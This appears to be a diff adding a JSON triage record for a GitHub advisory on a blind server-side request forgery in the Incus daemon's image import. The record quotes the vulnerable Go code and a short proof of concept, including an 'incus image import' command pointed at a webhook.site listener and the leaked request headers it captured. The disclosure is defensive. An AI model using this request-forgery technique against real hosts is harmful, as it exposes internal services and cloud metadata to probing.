@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/921555?v=4\", \"events_url\": \"https://api.github.com/users/stamparm/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/stamparm/followers\", \"following_url\": \"https://api.github.com/users/stamparm/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/stamparm/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/stamparm\", \"id\": 921555, \"login\": \"stamparm\", \"node_id\": \"MDQ6VXNlcjkyMTU1NQ==\", \"organizations_url\": \"https://api.github.com/users/stamparm/orgs\", \"received_events_url\": \"https://api.github.com/users/stamparm/received_events\", \"repos_url\": \"https://api.github.com/users/stamparm/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/stamparm/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/stamparm/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/stamparm\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/2230599?v=4\", \"events_url\": \"https://api.github.com/users/stgraber/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/stgraber/followers\", \"following_url\": \"https://api.github.com/users/stgraber/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/stgraber/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/stgraber\", \"id\": 2230599, \"login\": \"stgraber\", \"node_id\": \"MDQ6VXNlcjIyMzA1OTk=\", \"organizations_url\": \"https://api.github.com/users/stgraber/orgs\", \"received_events_url\": \"https://api.github.com/users/stgraber/received_events\", \"repos_url\": \"https://api.github.com/users/stgraber/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/stgraber/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/stgraber/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/stgraber\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-35527\", \"cvss\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 5.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:L/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"### Summary\\nA partial implementation of our `restricted.images.servers` project restriction allows users in such restricted projects to still cause Incus to send HEAD requests to arbitrary endpoints.\\n\\nThe actual image download will be rejected by the project restriction, but the ability to trigger arbitrary HTTP requests inside of the Incus environment can still be used as a way to discover otherwise hidden details about the environment.\\n\\n### Details\\nThe image import flow performs outbound network access to a user-supplied URL before the request is fully validated and before the import is rejected. The URL information helper constructs a HEAD request directly from the supplied source URL and immediately sends it to resolve image metadata.\\n\\nA host-originated HEAD request is issued from attacker-controlled input during the image import preflight stage. In the observed reproduction, this request is sent before the flow fails on later processing requirements, such as missing image metadata headers. As a result, an authenticated user can coerce the daemon into making blind outbound HEAD requests to arbitrary destinations. This yields a blind server-side request forgery (SSRF) primitive against internal services, unroutable address space, or cloud metadata endpoints reachable by the host. This vulnerability pattern is similar to CVE-2026-24767.\\n\\nAffected File:\\nhttps://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/images.go \\n\\nAffected Code:\\n```\\nfunc imgPostURLInfo(ctx context.Context, s *state.State, r *http.Request, req api.ImagesPost, op *operations.Operation, project string, budget int64) (*api.Image, error) {\\n    [...]\\n    head, err := http.NewRequest(\\\"HEAD\\\", req.Source.URL, nil)\\n    if err != nil {\\n        return nil, err\\n    }\\n\\n    [...]\\n\\n\\n    head.Header.Set(\\\"User-Agent\\\", version.UserAgent)\\n    head.Header.Set(\\\"Incus-Server-Architectures\\\", strings.Join(architectures, \\\", \\\"))\\n    head.Header.Set(\\\"Incus-Server-Version\\\", version.Version)\\n\\n    raw, err := myhttp.Do(head)\\n    if err != nil {\\n        return nil, err\\n    }\\n\\n    hash := raw.Header.Get(\\\"Incus-Image-Hash\\\")\\n    if hash == \\\"\\\" {\\n        return nil, errors.New(\\\"Missing Incus-Image-Hash header\\\")\\n    }\\n\\n    url := raw.Header.Get(\\\"Incus-Image-URL\\\")\\n    if url == \\\"\\\" {\\n        return nil, errors.New(\\\"Missing Incus-Image-URL header\\\")\\n    }\\n\\n    info, _, err := ImageDownload(ctx, r, s, op, &ImageDownloadArgs{\\n        Server:      url,\\n        Protocol:    \\\"direct\\\",\\n        Alias:       hash,\\n        AutoUpdate:  req.AutoUpdate,\\n        Public:      req.Public,\\n        ProjectName: project,\\n        Budget:      budget,\\n    })\\n    [...]\\n}\\n```\\n\\nThe following PoC demonstrates that an authenticated user can trigger a host-originated HEAD request to an arbitrary external URL during the image import preflight stage.\\n\\nStep 1: Select the reproduction project\\n\\nFrom an Incus client with access to the target server, switch into the project used for reproduction. In this environment, the selected project was configured as restricted=true with a restrictive restricted.images.servers policy.\\n\\nCommand:\\n```\\nincus project switch restricted\\n```\\n\\nStep 2: Trigger the preflight request to an arbitrary URL\\n\\nFrom the same Incus client, attempt to import an image from an attacker-controlled or observable URL. In this example, webhook.site is used as an external listener to capture the host-originated request.\\n\\nCommand:\\n```\\nincus image import https://webhook.site/0270eca3-4197-4194-97b6-1280f1070c3a --alias my-ssrf-image\\n```\\n\\nResult:\\n```\\nError: Missing Incus-Image-Hash header\\n```\\n\\nStep 3: Verify the outbound HEAD request in the external listener\\n\\nIn the webhook.site request log for the URL above, confirm that the Incus host issued a HEAD request before the import failed. In this reproduction environment, the request originated from a server running Incus v6.22.0.\\n\\nResult:\\n```\\nHEAD /0270eca3-4197-4194-97b6-1280f1070c3a HTTP/1.1\\nHost: webhook.site\\nUser-Agent: Incus 6.22 (Linux; x86_64; 6.19.6; Debian GNU/Linux; 13) (zfs 2.4.1-1)\\nIncus-Server-Version: 6.22\\nIncus-Server-Architectures: x86_64, i686\\n```\\n\\nIt is recommended to defer all outbound network interaction associated with URL-based image imports, including metadata preflight requests, until after the supplied URL has passed all validation and policy checks required by the import flow. If the import would later fail or be disallowed, the daemon should reject the request before issuing any network traffic.\\n\\n### Credit\\nThis issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)\", \"epss\": {\"percentage\": 0.00271, \"percentile\": 0.18686}, \"ghsa_id\": \"GHSA-8gw4-p4wq-4hcv\", \"github_reviewed_at\": \"2026-05-04T16:53:01Z\", \"html_url\": \"https://github.com/advisories/GHSA-8gw4-p4wq-4hcv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8gw4-p4wq-4hcv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-35527\"}], \"nvd_published_at\": \"2026-05-05T21:16:22Z\", \"published_at\": \"2026-05-04T16:53:01Z\", \"references\": [\"https://github.com/lxc/incus/security/advisories/GHSA-8gw4-p4wq-4hcv\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-35527\", \"https://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/images.go\", \"https://github.com/advisories/GHSA-8gw4-p4wq-4hcv\"], \"repository_advisory_url\": \"https://api.github.com/repos/lxc/incus/security-advisories/GHSA-8gw4-p4wq-4hcv\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/lxc/incus\", \"summary\": \"Incus has Blind SSRF via Image Import Preflight HEAD\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-08T15:30:50Z\", \"url\": \"https://api.github.com/advisories/GHSA-8gw4-p4wq-4hcv\", \"vulnerabilities\": [{\"first_patched_version\": \"7.0.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/lxc/incus/v6/cmd/incusd\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 7.0.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8gw4-p4wq-4hcv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/lxc/incus/v6/cmd/incusd: < 7.0.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-24767",
+      "CVE-2026-35527"
+    ],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/lxc/incus/v6/cmd/incusd"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.403538Z",
+  "provenance": {
+    "content_sha256": "79ff5377a330adacc97575121dcf0ff631d559edf2b68d38594ce7ee678c8bc4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-04T16:53:01Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8gw4-p4wq-4hcv",
+  "status": "active",
+  "title": "Incus has Blind SSRF via Image Import Preflight HEAD",
+  "updated_at": "2026-05-08T15:30:50Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8gw4-p4wq-4hcv"
+}
